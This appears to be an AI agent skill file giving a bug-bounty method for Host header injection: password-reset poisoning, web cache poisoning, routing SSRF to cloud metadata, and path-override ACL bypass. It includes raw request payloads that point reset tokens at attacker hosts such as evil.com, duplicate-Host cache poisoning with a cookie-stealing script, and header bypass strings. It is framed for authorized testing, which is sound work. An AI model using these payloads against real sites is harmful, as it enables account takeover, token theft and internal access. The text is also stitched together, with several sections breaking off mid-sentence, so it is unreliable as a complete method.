---
name: bbhunt-host-header
description: "Hunt password-reset poisoning, cache poisoning, routing SSRF and absolute-URL ACL bypass via Host and X-Forwarded headers. Unified from 2 upstream skills (cbh, hunting). For authorized security testing only."
agent_created: true
---

# Host header injection hunting — unified methodology

> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Step-by-Step Hunting Methodology

> Always test against **your own** registered test account. Never request another user's reset.

### A. Discovery checklist — concrete places, params, headers, infra signals to look

- Enumerate every Host-like carrier, not just `Host`: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-Original-Host`, `Forwarded: host=...`, `X-Rewrite-Url`, `X-Original-URL`. Frameworks trust these by default (Craft CMS, Laravel, Django-style absolute URL builders). CVE-2026-42606 (AzuraCast) is a fresh example: `ApplyXForwarded` middleware unconditionally trusts `X-Forwarded-Host`, poisoning reset links -> token theft -> 2FA bypass.
- Find every place the application builds an absolute URL: password-reset emails, email-verification/invite links, `Location` redirects, canonical/OG tags, `<script src="//host/...">`, payment return URLs, OAuth `redirect_uri` / issuer / discovery documents, webhook callbacks.
- Map the proxy topology from response headers and banners. The bug usually lives in a *disagreement*: front-end uses the first Host for routing, back-end uses the second for URL construction. Look for `X-Cache-Status: HIT` that stays HIT after injecting a second Host (proves Host is not in the key).
- Test every Host mutation class: omit Host (HTTP/1.0), duplicate Host, absolute-form request line (`GET https://target/ HTTP/1.1` plus a different Host), port suffix, userinfo, prefix/whitelist bypass, trailing `@`, whitespace before colon, and duplicate values concatenated with commas.
- Note that validation often covers only the first header instance or only `Host` — not overrides. Confirm what the app actually reflects in the response/email before escalating.
- For routing-based 

### Signals and surfaces

### Crown Jewel Targets

Host header injection that reaches password reset links = Critical (ATO for any user).

**Highest-value chains:**
- **Password reset poisoning → ATO** — server builds the reset link from the request Host;
  attacker sets `Host: evil.com`; the victim's reset email points the token at the attacker →
  token captured on click → full ATO. Pre-account-takeover variant: even the victim *requesting*
  their own reset leaks the token to evil.com.
- **Web cache poisoning via unkeyed Host** — a CDN/reverse proxy caches a response that reflects
  an attacker `X-Forwarded-Host` into an absolute URL (script src, link, redirect) → poisoned
  entry served to every later visitor on that cache key → mass XSS/redirect/CSP bypass.
- **Routing-based SSRF** — the front-end uses the *Host header itself* to pick the upstream;
  `Host: 169.254.169.254` (or an internal hostname) makes it forward your request to that target
  → cloud metadata / internal admin panels.
- **Path-override SSRF / ACL bypass** — IIS/ASP.NET/Spring honour `X-Original-URL` /
  `X-Rewrite-URL` to override the routed path → reach `/admin` or internal endpoints the edge
  ACL thought it blocked. (Different layer from routing SSRF — see Phase 3.)
- **OAuth/OIDC poisoning** — Host drives `redirect_uri` or the OIDC `issuer` / discovery doc →
  auth-code or token theft → ATO.

---

### Attack Surface Signals

```
Any password reset / forgot-password / email-verification / invite endpoint
Any app behind CDN/reverse proxy (Cloudflare, Varnish, Fastly, Akamai, Nginx, HAProxy)
OAuth/OIDC authorization + /.well-known/openid-configuration endpoints
Absolute URLs constructed from request Host (set-password links, share links, webhooks)
Email-sending endpoints (transactional mail, notifications)
Reverse proxies that may route by Host (k8s ingress, service mesh, internal forward proxies)
```

**Dangerous header candidates (unkeyed / trusted inputs):**
```
Host                 X-Forwarded-Host      X-Host
X-Forwarded-Server   X-HTTP-Host-Override  Forwarded
X-Original-URL       X-Rewrite-URL         X-Override-URL   (path-override class)
```

---

### Techniques, payloads and bypasses

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Password-reset poisoning — the canonical probe:
  ```
  POST /password-reset HTTP/1.1
  Host: www.attackers-domain.example
  ...
  user=alice
  ```
  Then check the emailed link. Try `X-Forwarded-Host: evil.com`, `X-Host`, and `Forwarded`. A 2026 advisory shows the same flaw with a direct `curl -H "X-Forwarded-Host: evil.com"`.
- Weak-validation bypass via userinfo (Slack H1 #727330): append `@` so the real host is parsed as HTTP Basic auth user:
  ```
  X-Forwarded-Host: files.slack.com@www.unique-attacker-domain.example
  ```
  The app sees a "valid" files.slack.com prefix; the HTTP client treats the attacker domain as the host -> blind SSRF with OOB callback.
- Duplicate-Host / ambiguous-request cache poisoning (PortSwigger lab): front-end routes on the first Host, back-end builds script URLs from the second:
  ```
  GET / HTTP/1.1
  Host: target
  Host: exploit-server.example
  ```
  Combine with `/resources/js/tracking.js` containing `alert(document.cookie)` for stored XSS served from cache.
- Absolute-form request line discrepancy:
  ```
  GET https://target/ HTTP/1.1
  Host: bad-stuff-here
  ```
  RFC says the request line wins for routing; many stacks use Host — exploit the split.
- Host with port / prefix tricks: `target:evil.com`, `target.evil.com`, `evil.com/target`, `target%00.evil.com`, `target.` (trailing dot), whitespace before colon (`Host :`), and duplicate values separated by commas. Always compare reflected output against a baseline.
- Routing SSRF via Host (path on request li

### Validation and proof

### Validation (house discipline)

✅ **Password reset:** the token URL in **your own test account's email** uses an
attacker-controlled host. Strongest proof = inject a **Collaborator** host and show the inbound
HTTP hit carrying the token when the link is clicked/previewed (OOB capture).
✅ **Cache poison:** a request that **omits** the injected header (fresh egress IP / incognito)
still returns the attacker payload → shared-cache poisoning proven. Demote to Low if Vary-keyed or
`MISS`/`Age:0` only.
✅ **Routing SSRF:** real response body from `169.254.169.254` / internal host, **or** an OOB
DNS/HTTP hit on your Collaborator from the front-end (blind case).
✅ **Path-override:** status/body diff vs the edge-blocked direct request proves the override took.
✅ **OAuth/OIDC:** the auth code / token is actually delivered to the attacker host (captured),
not merely reflected.

**Always rule out false positives:**
- Reflected ≠ cached. Cached-for-you ≠ cached-for-others (check `Vary`, second IP).
- A 200 echoing your Host string is not SSRF unless the *response content* came from the internal
  target or your Collaborator fired.
- Some mailers rewrite links to a fixed `SITE_URL` regardless of Host — reflected header in the
  HTTP response does not guarantee a poisoned *email*; verify the email body.

**Severity:**
- Reset → ATO for any user: Critical
- Routing SSRF → cloud metadata creds: Critical (if creds usable) / High
- Cache poisoning → mass XSS/redirect (shared key proven): High
- Path-override → internal/admin reach: High
- Reflected only, uncacheable, not in email, no intern

### C. Validation / proof bar — how to confirm and avoid false positives

- Reflection alone is not impact. Show the *downstream* consequence: reset email containing the attacker host + a live captured token; a cached poisoned response delivered to a clean second session; an OOB callback from the proxy; or an actual redirect of a victim to the attacker domain.
- For reset poisoning, capture the token in a server you control, then complete a real password reset against the genuine host with that token. Demonstrate takeover of a test account you own — do not stop at "the link points to evil.com."
- Distinguish Host injection from web cache poisoning: if the malicious Host only affects your own request, it is low impact. It becomes High/Critical when the poisoned response is cached and served to other users (check `X-Cache` stays HIT on a clean fetch) or when it enables ATO/SSRF.
- Beware false positives from wildcard DNS / catch-all virtual hosts: if any random Host resolves to the app, reflection is expected. Require that the app uses the value in a security-relevant URL.
- Confirm which Host instance each hop uses; somelabs require the victim's `session` and `_lab` cookie for the double-Host behavior. Document session/cookie prerequisites so triage can reproduce.
- Defensive framing: avoid absolute URLs from Host (use a configured canonical domain), validate Host against an allowlist, reject duplicate Host headers, and do not support override headers by default.

### Escalation and related chains

### Chain Table

| Finding | Chain to | Impact |
|---------|----------|--------|
| Reset link host = attacker (own test acct) | Collaborator-host injection → capture token on click | Critical — ATO any user |
| X-Forwarded-Host reflected in absolute URL + cacheable, unkeyed | Poison key → clean fetch returns payload → load XSS/redirect | High — mass cache poisoning |
| Front-end routes by Host | `Host: 169.254.169.254` path-on-request-line → creds | High/Critical — SSRF → cloud creds |
| `X-Original-URL` overrides path | Reach `/admin` blocked at edge | High — ACL bypass / SSRF |
| OAuth redirect_uri/issuer built from Host | Re-point flow → capture code/token on Collaborator | Critical — ATO via code theft |

---

## Source skills merged into this topic

- `hunting` — `host-header`
- `cbh` — `hunt-host-header`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
